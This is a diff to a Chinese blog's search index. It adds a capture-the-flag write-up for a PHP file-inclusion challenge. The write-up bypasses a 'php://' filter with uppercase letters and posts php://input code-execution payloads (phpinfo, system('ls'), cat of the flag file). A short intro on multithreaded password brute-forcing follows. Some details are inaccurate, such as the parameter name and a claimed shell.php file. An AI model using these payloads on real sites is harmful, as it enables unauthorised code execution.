@@ -1,6 +1,50 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>攻防世界Web_php_include题解</title>
+    <url>/2022/05/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3/</url>
+    <content><![CDATA[<p>题目地址：<a href><code>Web_php_include</code></a></p>
+<p>打开场景后，是<code>index.php</code>的源码：<a id="more"></a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>大概解读一下，首先获取参数<code>hello</code>并将其值输出，然后获取<code>page</code>参数的值，接着如果<code>page</code>参数中如果包含<code>php://</code>子串，则将其替换，直至不再包含该子串；然后将替换后的参数值作为文件名，将其文件引入到<code>index.php</code>中。</p>
+<p>思路：二话不说，先用御剑扫描工具扫一下，看看有哪些可以访问的，然后发现一个后台登录地址，原本想爆破密码的，但是想了想，题目是说<code>include</code>，所以应该不是爆破密码。</p>
+<p>应该还是从源码中的<code>include</code>下手，当然了我们得先绕过替换字符串的代码，我们可以用大写的<code>PHP</code>进行代替<code>php</code>，然后我又去搜了一下<code>php include</code>漏洞，发现还真不少，其中有一个比较适合：</p>
+<p>以<code>POST</code>方式提交代码片段：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//input</span></span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后将会在 <code>index.php</code>所在文件下的文件 <code>shell.php</code> 内增加 <code>&lt;?php phpinfo();?&gt;</code> 一句话</p>
+<p>不过得有两个条件:</p>
+<ul>
+<li><p><code>allow_url_include = On</code></p>
+</li>
+<li><p>对 <code>allow_url_fopen</code>不做要求。</p>
+</li>
+</ul>
+<p>结合本题，我们应该构造下面的请求：</p>
+<p><img src="/2022/05/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3/C:%5CUsers%5CYalexin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220520115557474.png" alt="image-20220520115557474"></p>
+<p>提交过后，果然在页面中获取了很多信息。</p>
+<p>那我们看看当前目录下都有哪些文件吧：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后我们发现了一个文件：<code>fl4gisisish3r3.php</code></p>
+<p>好！我们输出看一下里边的内容：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> system(<span class="string">'cat fl4gisisish3r3.php'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>果然获取了<code>flag</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>==黑帽白帽，就在一念之间！==</p>
+]]></content>
+      <categories>
+        <category>网络攻防</category>
+      </categories>
+      <tags>
+        <tag>include漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用python多线程爆破数字密码</title>
     <url>/2022/05/14/%E4%BD%BF%E7%94%A8python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%86%E7%A0%B4%E6%95%B0%E5%AD%97%E5%AF%86%E7%A0%81/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说起网络密码爆破，我们可能第一时间想到大名鼎鼎的软件<code>Burp Suite</code>，该软件可以方便地进行网络代理，数据截包、改包，密码爆破，但是密码爆破效率实在是太低，如果我们知道密码的类型，例如是纯数字的密码，那我们可以将密码进行分段，不同的范围使用一个线程进行爆破，利用并发进行节省时间。</p>
@@ -325,9 +369,9 @@
         <category>笔记</category>
       </categories>
       <tags>
-        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
+        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -393,9 +437,9 @@
         <category>笔记</category>
       </categories>
       <tags>
-        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
+        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -445,9 +489,9 @@
         <category>笔记</category>
       </categories>
       <tags>
-        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
+        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -517,9 +561,9 @@
         <category>笔记</category>
       </categories>
       <tags>
-        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
+        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -683,9 +727,9 @@
         <category>笔记</category>
       </categories>
       <tags>
-        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
+        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -831,9 +875,9 @@
         <category>笔记</category>
       </categories>
       <tags>
-        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
+        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -883,9 +927,9 @@
         <category>笔记</category>
       </categories>
       <tags>
-        <tag>命令行</tag>
         <tag>Git</tag>
         <tag>学习</tag>
+        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
@@ -1224,8 +1268,8 @@
       </categories>
       <tags>
         <tag>贪心算法</tag>
-        <tag>递归</tag>
         <tag>动态规划</tag>
+        <tag>递归</tag>
         <tag>C++</tag>
         <tag>深度优先</tag>
       </tags>
@@ -4986,8 +5030,8 @@
         <category>Linux相关</category>
       </categories>
       <tags>
-        <tag>命令行</tag>
         <tag>学习</tag>
+        <tag>命令行</tag>
       </tags>
   </entry>
   <entry>
